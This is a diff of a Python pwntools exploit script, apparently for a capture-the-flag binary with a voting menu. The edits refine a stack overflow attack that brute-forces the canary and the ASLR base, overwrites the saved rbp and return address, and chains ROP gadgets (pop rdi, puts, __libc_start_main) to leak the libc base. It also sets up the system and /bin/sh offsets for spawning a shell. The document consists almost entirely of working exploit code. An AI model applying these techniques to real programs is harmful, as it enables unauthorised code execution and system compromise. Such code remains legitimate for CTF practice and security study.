@@ -13,9 +13,9 @@ token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 offset_binsh = next(libc.search('/bin/sh'))
 offset_system = libc.symbols['system']
 offset_puts = elf.symbols['puts']
-print('offset_binsh --> ', hex(offset_binsh))
-print('offset_system --> ', hex(offset_system))
-print('offset_puts --> ', hex(offset_puts))
+# print('offset_binsh --> ', hex(offset_binsh))
+# print('offset_system --> ', hex(offset_system))
+# print('offset_puts --> ', hex(offset_puts))
 
 # accumulate vote for enough space to write buffer
 angel_vote = 0
@@ -38,24 +38,31 @@ def hack_vote_ret(canary, base):
     print('pop_r14r15_ret ', hex(pop_r14r15_ret))
 
     r.sendlineafter('>', '2')
-
-    # The more votes.... say!
     r.sendlineafter('9]: ', '1')
 
-    # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
     msg = '\x87' * 0xe8
-    send_idx = p64(1)
-    choice_n = p64(2)
     canary = p64(canary)
-    #                           |msg | cannary   |   rbp       |   ret            |)
-    r.sendlineafter('Message: ', msg + canary + '\x87' * 0x08  + p64(pop_r14r15_ret))
 
-    # Done!
-    # quit voting --> SIGABRT occurred
+    # store rbp somewhere in bss where all of them are 0 to avoid bss corruption
+    rbp = base + 0x202000
+    rbp = p64(rbp)
+    # print('store rbp in --> ', hex(rbp))
+    #                           |msg | cannary   |   rbp       |   ret            |)
+    r.sendlineafter('Message: ', msg + canary    +  rbp        + p64(pop_r14r15_ret))
+
+    # quit voting --> GET libc base
     pause()
-    print('finished hack vote ret --> ', r.recv())
     r.sendline('3')
-    # r.sendlineafter('>', '3')
+    recv_str = r.recv().split()
+
+    # print(recv_str)
+    # print(len(recv_str[-1]))
+
+    libc_base = u64(recv_str[-1] + '\0\0') - 0x201ab0
+    print('libc_base --> ', hex(libc_base))
+    pause()
+
+    return libc_base
 
 def hack_canary_ASLR():
     canary = ''
@@ -63,7 +70,7 @@ def hack_canary_ASLR():
     guess = 0
 
     buf = ''
-    buf += 'A' * canary_offset
+    buf += '\x87' * canary_offset
 
     r.sendlineafter('>', '2')
     r.sendlineafter('token: ', buf)
@@ -111,6 +118,7 @@ def hack_canary_ASLR():
             guess += 1
 
     print('ASLR base --> ', hex(u64(aslr) - 0x1140))
+    pause()
     return u64(canary), u64(aslr) - 0x1140
 
 # craft the rop for libc base
@@ -118,6 +126,7 @@ def rop_libc_base(canary, base):
     p = ''
     # 0x00000000000011a3 : pop rdi ; ret: to get rdi
     pop_rdi = base + 0x11a3
+    p += p64(pop_rdi)
 
     # 0x201fe0 <__libc_start_main@GLIBC_2.2.5>, assign this to rdi
     libc_start_main = base + 0x201fe0
@@ -127,6 +136,18 @@ def rop_libc_base(canary, base):
     puts = base + offset_puts
     p += p64(puts)
 
+    '''
+    # return to main function
+    pop_rdi = base + 0x11a3
+    p += p64(pop_rdi)
+
+    addr_main = base + 0xffb
+    p += p64(addr_main)
+    '''
+
+    print('pop_rdi for libc_base --> ', hex(pop_rdi))
+    print('libc_start_main libc_base --> ', hex(libc_start_main))
+    print('puts for libc_base --> ', hex(puts))
     print('ROP for libc_base --> ', p)
     return p
 
